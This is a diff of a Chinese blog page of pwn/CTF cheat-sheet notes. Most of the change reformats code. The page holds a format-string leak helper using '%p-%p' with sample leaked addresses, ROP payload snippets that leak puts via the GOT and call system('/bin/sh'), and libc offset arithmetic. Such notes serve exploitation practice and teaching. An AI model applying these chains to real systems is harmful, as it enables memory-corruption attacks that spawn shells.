@@ -468,7 +468,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    612
+                    606
                 </div>
                 
 
@@ -540,19 +540,33 @@ leak_result<span class="token punctuation">(</span><span class="token string">"i
 <ul>
 <li>spli为要进行切割的字符串</li>
 <li>length为要每一段要保留的长度(如果是libc的地址6个字节,需要的长度为12)</li>
-<li>需要先查看输出再决定保留哪一部分<pre class=" language-python"><code class="language-python"></code></pre>
-</li>
+<li>需要先查看输出再决定保留哪一部分</li>
 </ul>
-<h1 id="列表字符串转int-包含一个输出"><a href="#列表字符串转int-包含一个输出" class="headerlink" title="列表字符串转int,包含一个输出"></a>列表字符串转int,包含一个输出</h1><p>def get_int(content):<br>    content=[int(i,16) for i in content]<br>    out=[hex(i) for i in content]<br>    print(“content to int end is : “,out)<br>    return content</p>
-<p>def get_formate_result(spli=”0x”,length=12):<br>    info=p.recv()<br>    info=info.split(spli)<br>    info=[i[0:length] for i in info]<br>    print(“leak info (may set a and b to get real info) : “,info)<br>    return info</p>
-<p>send_name(“%p-%p”)#中间长度不够12的元素将会被舍弃<br>show_name()<br>info=get_formate_result()<br>info=get_int(info[1:])</p>
-<p>输出结果为<br>(‘leak info (may set a and b to get real info) : ‘, [‘Current user’, ‘7ffc95a046f0’, ‘7f409df8a780’])<br>(‘content to int end is : ‘, [‘0x7ffc95a046f0’, ‘0x7f409df8a780’])</p>
-<pre><code>## 常用payload
-### 常用rop(待添加如ret2dl的,栈迁移的等)
+<pre class=" language-python"><code class="language-python">
+<span class="token comment" spellcheck="true"># 列表字符串转int,包含一个输出</span>
+<span class="token keyword">def</span> <span class="token function">get_int</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    content<span class="token operator">=</span><span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>
+    out<span class="token operator">=</span><span class="token punctuation">[</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"content to int end is : "</span><span class="token punctuation">,</span>out<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> content
 
-#### 泄露puts函数got表
-``` python
-p64(pop_rdi_ret)+p64(elf.got[&quot;puts&quot;])+p64(elf.plt[&quot;puts&quot;])+p64(下一次返回的地址)</code></pre>
+<span class="token keyword">def</span> <span class="token function">get_formate_result</span><span class="token punctuation">(</span>spli<span class="token operator">=</span><span class="token string">"0x"</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    info<span class="token operator">=</span>info<span class="token punctuation">.</span>split<span class="token punctuation">(</span>spli<span class="token punctuation">)</span>
+    info<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>length<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> info<span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak info (may set a and b to get real info) : "</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> info
+
+send_name<span class="token punctuation">(</span><span class="token string">"%p-%p"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#中间长度不够12的元素将会被舍弃</span>
+show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
+info<span class="token operator">=</span>get_formate_result<span class="token punctuation">(</span><span class="token punctuation">)</span>
+info<span class="token operator">=</span>get_int<span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+输出结果为
+<span class="token punctuation">(</span><span class="token string">'leak info (may set a and b to get real info) : '</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'Current user'</span><span class="token punctuation">,</span> <span class="token string">'7ffc95a046f0'</span><span class="token punctuation">,</span> <span class="token string">'7f409df8a780'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token string">'content to int end is : '</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'0x7ffc95a046f0'</span><span class="token punctuation">,</span> <span class="token string">'0x7f409df8a780'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+</code></pre>
+<h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><h3 id="常用rop-待添加如ret2dl的-栈迁移的等"><a href="#常用rop-待添加如ret2dl的-栈迁移的等" class="headerlink" title="常用rop(待添加如ret2dl的,栈迁移的等)"></a>常用rop(待添加如ret2dl的,栈迁移的等)</h3><h4 id="泄露puts函数got表"><a href="#泄露puts函数got表" class="headerlink" title="泄露puts函数got表"></a>泄露puts函数got表</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>下一次返回的地址<span class="token punctuation">)</span></code></pre>
 <h4 id="调用system-“-bin-sh”"><a href="#调用system-“-bin-sh”" class="headerlink" title="调用system(“/bin/sh”)"></a>调用system(“/bin/sh”)</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
 <h2 id="计算方法"><a href="#计算方法" class="headerlink" title="计算方法"></a>计算方法</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>泄露-目的=偏移——&gt;目的=泄露-偏移<br>例:</p>
 <pre class=" language-python"><code class="language-python">泄露libc地址<span class="token operator">-</span>vmmap得出来的libc基地址
